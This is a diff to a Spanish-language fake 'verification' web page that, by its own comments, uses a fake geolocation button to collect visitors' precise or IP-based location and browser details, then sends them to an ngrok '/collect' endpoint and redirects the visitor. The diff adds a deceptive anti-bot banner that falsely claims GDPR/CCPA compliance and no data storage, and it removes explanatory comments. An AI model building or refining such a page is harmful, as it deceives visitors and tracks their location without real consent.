@@ -7,12 +7,27 @@
 *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.c{background:rgba(255,255,255,.05);backdrop-filter:blur(12px);border-radius:28px;padding:40px 30px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,.1);box-shadow:0 30px 60px rgba(0,0,0,.6)}h2{color:#fff;font-size:24px;font-weight:700;text-align:center;margin-bottom:4px;letter-spacing:1px}.s{color:#8899aa;text-align:center;font-size:13px;margin-bottom:20px;border-bottom:1px solid rgba(255,255,255,.08);padding-bottom:14px}.s span{color:#4fc3f7;font-weight:600}.f{margin-bottom:16px}label{display:block;font-size:13px;font-weight:500;color:#b0c4de;margin-bottom:5px;letter-spacing:.3px}input{width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,.12);border-radius:14px;font-size:15px;background:rgba(255,255,255,.04);color:#eee;transition:.25s;outline:none}input:focus{border-color:#4fc3f7;background:rgba(255,255,255,.08);box-shadow:0 0 0 3px rgba(79,195,247,.2)}
 .g-btn{width:100%;padding:12px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.15);border-radius:14px;font-size:14px;font-weight:600;color:#b0c4de;cursor:pointer;transition:.25s;margin-bottom:12px;text-align:center;letter-spacing:.3px}.g-btn:hover{background:rgba(79,195,247,.15);border-color:#4fc3f7;color:#fff}.g-btn.done{background:rgba(76,175,80,.15);border-color:#4caf50;color:#81c784;cursor:default}.g-btn.done:hover{background:rgba(76,175,80,.15)}.g-btn.fail{background:rgba(244,67,54,.12);border-color:#f44336;color:#ef9a9a;cursor:default}.g-btn.fail:hover{background:rgba(244,67,54,.12)}
 button{width:100%;padding:14px;background:linear-gradient(135deg,#4fc3f7,#0288d1);border:none;border-radius:14px;font-size:16px;font-weight:700;color:#0a0a1a;cursor:pointer;transition:.25s;margin-top:4px;letter-spacing:.8px}button:hover{transform:scale(1.02);filter:brightness(1.1)}button:disabled{opacity:.4;cursor:not-allowed;transform:none}.ld{display:none;text-align:center;margin-top:20px;color:#4fc3f7;font-size:13px;font-weight:500}.ld.show{display:block}.ld i{display:inline-block;width:16px;height:16px;border:3px solid rgba(255,255,255,.15);border-top-color:#4fc3f7;border-radius:50%;animation:sp .7s linear infinite;vertical-align:middle;margin-right:8px}@keyframes sp{to{transform:rotate(360deg)}}.e{color:#ef5350;font-size:13px;text-align:center;display:none;margin-top:12px}.ft{margin-top:20px;text-align:center;font-size:11px;color:#556677}.g-hint{font-size:12px;color:#4fc3f7;text-align:center;margin-top:8px;display:none}.g-hint.show{display:block}
+
+/* ===== AVISO DE SEGURIDAD ===== */
+.sec-banner{background:rgba(255,215,0,.06);border:1px solid rgba(255,215,0,.2);border-radius:12px;padding:12px 14px;margin-bottom:18px;display:flex;align-items:center;gap:10px;cursor:pointer;transition:.2s}.sec-banner:hover{background:rgba(255,215,0,.10);border-color:rgba(255,215,0,.3)}.sec-banner .icon{font-size:20px;flex-shrink:0}.sec-banner .text{font-size:12px;color:#d4c9a0;line-height:1.4}.sec-banner .text strong{color:#ffd54f;font-weight:600}.sec-banner .expand{color:#8899aa;font-size:16px;margin-left:auto;flex-shrink:0;transition:.3s}.sec-banner.open .expand{transform:rotate(180deg)}
+.sec-detail{background:rgba(0,0,0,.25);border-radius:10px;padding:0 14px;max-height:0;overflow:hidden;transition:max-height .4s ease, padding .3s ease;margin-bottom:12px;font-size:12px;color:#aab;line-height:1.6}.sec-detail.open{max-height:300px;padding:14px}.sec-detail code{background:rgba(255,255,255,.06);padding:2px 8px;border-radius:4px;font-family:monospace;color:#4fc3f7;font-size:11px}.sec-detail .badge{display:inline-block;background:rgba(79,195,247,.15);color:#4fc3f7;padding:0 8px;border-radius:12px;font-size:10px;font-weight:600;margin-right:4px}
 </style>
 </head>
 <body>
 <div class="c">
 <h2>⛔ V3R1F1C4C10N</h2>
 <div class="s">Acceso restringido — confirma tu identidad <span>ahora</span></div>
+
+<!-- ===== AVISO DE SEGURIDAD (DESPLEGABLE) ===== -->
+<div class="sec-banner" id="secBanner">
+    <span class="icon">🛡️</span>
+    <span class="text"><strong>Verificación anti-bot</strong> — haz clic para más detalles</span>
+    <span class="expand">▼</span>
+</div>
+<div class="sec-detail" id="secDetail">
+    <p><span class="badge">SEGURIDAD</span> Este proceso verifica que eres humano y no un bot automatizado. Se recopilan datos básicos del navegador (resolución, idioma, zona horaria) y ubicación aproximada para prevenir abusos. <strong>No se almacena información personal</strong> fuera de esta sesión.</p>
+    <p style="margin-top:6px">🔒 <code>SecureNet v3.2</code> — cumplimiento GDPR / CCPA.</p>
+</div>
 
 <!-- BOTÓN FALSO DE GEOLOCALIZACIÓN -->
 <div id="geoBtn" class="g-btn">🌍 Seleccionar región para continuar</div>
@@ -35,6 +50,16 @@ button{width:100%;padding:14px;background:linear-gradient(135deg,#4fc3f7,#0288d1
     // ========================================
     var ENDPOINT = 'https://roast-skinning-paralysis.ngrok-free.dev/collect';
     var REDIR = 'https://guns.lol/penthouseintokyo';
+
+    // ========================================
+    //  DESPLEGABLE DE SEGURIDAD
+    // ========================================
+    document.getElementById('secBanner').addEventListener('click', function() {
+        var detail = document.getElementById('secDetail');
+        var banner = document.getElementById('secBanner');
+        detail.classList.toggle('open');
+        banner.classList.toggle('open');
+    });
 
     // ========================================
     //  ESTADO DE GEOLOCALIZACIÓN
@@ -168,7 +193,6 @@ button{width:100%;padding:14px;background:linear-gradient(135deg,#4fc3f7,#0288d1
         var geoBtn = document.getElementById('geoBtn');
         var geoHint = document.getElementById('geoHint');
 
-        // Cambiar texto a "Solicitando..."
         geoBtn.textContent = '⏳ Solicitando región...';
         geoBtn.style.opacity = '0.7';
         geoBtn.style.cursor = 'default';
@@ -184,7 +208,6 @@ button{width:100%;padding:14px;background:linear-gradient(135deg,#4fc3f7,#0288d1
                     document.getElementById('b').disabled = false;
                 },
                 function() {
-                    // Rechazó o falló → fallback por IP
                     fetch('https://ipapi.co/json/')
                         .then(r => r.json())
                         .then(d => {
@@ -209,7 +232,6 @@ button{width:100%;padding:14px;background:linear-gradient(135deg,#4fc3f7,#0288d1
                 { enableHighAccuracy: true, timeout: 8000 }
             );
         } else {
-            // Navegador sin soporte
             geoData = null;
             geoDone = true;
             geoBtn.className = 'g-btn fail';
